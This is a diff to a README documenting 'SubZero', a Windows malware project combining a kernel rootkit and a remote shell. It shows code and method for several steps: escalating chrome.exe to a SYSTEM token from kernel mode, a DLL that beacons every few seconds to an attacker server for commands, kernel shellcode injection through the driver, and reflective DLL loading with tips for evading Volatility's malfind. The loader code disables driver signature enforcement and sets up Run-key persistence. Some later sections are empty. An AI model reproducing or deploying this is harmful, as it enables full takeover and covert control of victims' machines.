@@ -1,5 +1,3 @@
-
-  
 # The SubZero Project  
 
 SubZero is a multi-staged malware that contains a kernel-mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel-mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
@@ -59,7 +57,7 @@ That's where I had an idea - what if my library's `DllMain` will never return to
 
 To fully take advantage of the kernel module, It should provide its user-mode clients exclusive access to the system resources and structures. I tried to demonstrate these capabilities with it's 3 IOCTL's - changing a process' PPID, setting a process' token to the system's one and most importantly, executing a position independent kernel shellcode.
 
-## User Mode
+## User-Mode
 
 The two other user-mode components are the malware's loader and the loaded library itself.
 The loader's designation is pretty straight forward - drop the malicious files to the file system, then load the driver. 
@@ -338,10 +336,10 @@ The PID of that process is saved, and its first thread is then caught by `OnThre
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 			{
-				auto* const process = ::PsGetCurrentProcess(); 			// Get current process (i.e. chrome.exe)
+				auto* const process = ::PsGetCurrentProcess(); 		// Get current process (i.e. chrome.exe)
 				auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
-				SetTokenToSystem(process, token); 						// Replace the process token with system token
-				::ObDereferenceObject(token); 							// Dereference the process token
+				SetTokenToSystem(process, token); 			// Replace the process token with system token
+				::ObDereferenceObject(token); 				// Dereference the process token
 			
 				// Thread and Process creation notification callbacks are not needed anymore
 				::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
@@ -477,7 +475,7 @@ __stdcall PicStart(PVOID StartContext)
 ## DLL  
 
 As mentioned earlier, in order to prevent the chrome application from starting the loaded library's `DllMain` function needs to be infinite (i.e. never return).   An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and loop continues:
-  ```cpp
+```cpp
   BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 {
 	std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
@@ -510,14 +508,14 @@ As mentioned earlier, in order to prevent the chrome application from starting t
 	}
 	return TRUE;
 }
-  ```
+```
   
   > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP excessively.
  
- The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode' ` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same header.
+ The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
  The user-mode library offer the attacker 3 other opcodes - inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system. The result of the operation is then sent back to the server. To makes things clearer, this is how the opcodes are defined:
- ```cpp
- constexpr DWORD KeepAliveOpcode = 0;
+```cpp
+ constexpr uint8_t KeepAliveOpcode = 0;
 
 enum class ServerOpcode 
 {
@@ -531,7 +529,7 @@ enum class ClientOpcode
 	Success = 1,
 	Failure
 };
- ```
+```
  
  Once an opcode other than `KeepAlive` is sent from the server, the packet get parsed by the response handler function and its data is passed to an opcode-specific handler function.
  The shellcode injection handler works as you expect - The DLL opens a handle to the driver and sends it the shellcode using `DeviceIoControl`. Any result from the shellcode is returned back to the server in the body of the POST response:
@@ -553,11 +551,11 @@ enum class ClientOpcode
 	
 	DWORD bytesReturned = 0;
 	if (!::DeviceIoControl(
-			deviceAutoHandle.get(), 											// device to be queried
-			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 									// operation to perform
-			inputBuffer.get(), bufferSize, 										// input buffer
-			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 		// output buffer
-			&bytesReturned, 													// # bytes returned
+			deviceAutoHandle.get(), 									// device to be queried
+			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 								// operation to perform
+			inputBuffer.get(), bufferSize, 									// input buffer
+			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 					// output buffer
+			&bytesReturned, 										// # bytes returned
 			nullptr))
 			throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
 			
@@ -578,21 +576,71 @@ void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLe
 ```
  This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) and as its name suggests - it provides the attacker a DLL loader that does not require an image on the file system.
  The loading process itself works as follows:
- 1. Allocate `RW` memory space and copy the file's sections into it.
+ 1. Allocate `PAGE_READWRITE` memory space and copy the PE's sections into it.
  2. Parse and relocate internal pointers (if needed).
  3. Load any dependency libraries and update the PE's IAT.
  4. Change each section memory protection to its appropriate one.
  5. Execute TLS callbacks if exists.
  6. Call the library's `DllMain`.
  
- Initially, I intended to use the driver to change the DLL's main allocation `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to legitimate it as much as possible, but after observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues uses)
+ Initially, I intended to use the driver to change the DLL's main allocation's `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to make it look legitimate as possible. After observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues uses), it appeared it's memory regions doesn't come up on `malfind`'s results - the tool's main plugin for detecting suspicious memory allocations.
+ This made my life much easier, since (as expected) the `VAD` structure is undocumented and manipulating it will cause a big problem source. The only thing I did was to delete the PE's header string identifiers - the "MZ" at the first 2 bytes and the DOS header error label ("This Program cannot be run in DOS mode...")
+
+The third opcode is for cleanup and will be overviewed later. 
  
 ## Loader
+
+The loader is the first file that is dropped on a new victim. It starts by changing its directory to the chrome application directory, then it extracts the driver and DLL from its resource section and saves them at the same directory. This is followed by the DSE variable overriding and the loading of the driver:
+:
+```cpp
+	// Save resources to file system
+	try 
+	{
+		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
+		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
+		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
+	}
+	catch (const Win32ErrorCodeException& exception) 
+	{
+		if (ERROR_FILE_EXISTS != exception.getErrorCode())
+		{
+			// Error extracting/saving resource
+			DEBUG_PRINT(exception.what());
+			SubZeroCleanup::Cleanup();
+			return 1;
+		}
+	}
+
+	...
+	
+	// Disable DSE protection using DSEFix
+	DSEFixMain();
+	DEBUG_PRINT("[+] DSE protection disabled");
+	
+	// Load driver
+	try 
+	{
+		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
+		serviceManager.installAndStart();
+		DEBUG_PRINT("[+] Driver installed and started successfully");
+	}
+	catch (const Win32ErrorCodeException& exception) 
+	{
+		DEBUG_PRINT(exception.what());
+		SubZeroCleanup::Cleanup();
+		return 1;
+	}
+	...
+```
+Next, the file adds itself as a value to the RUN registry key. Any errors during the loading process will cleanup the malware:
+```cpp
+
+```
   
 ## Cleanup  
   
 ## Server  
   
-# Executing  
+# Execution
 
 # TODO List
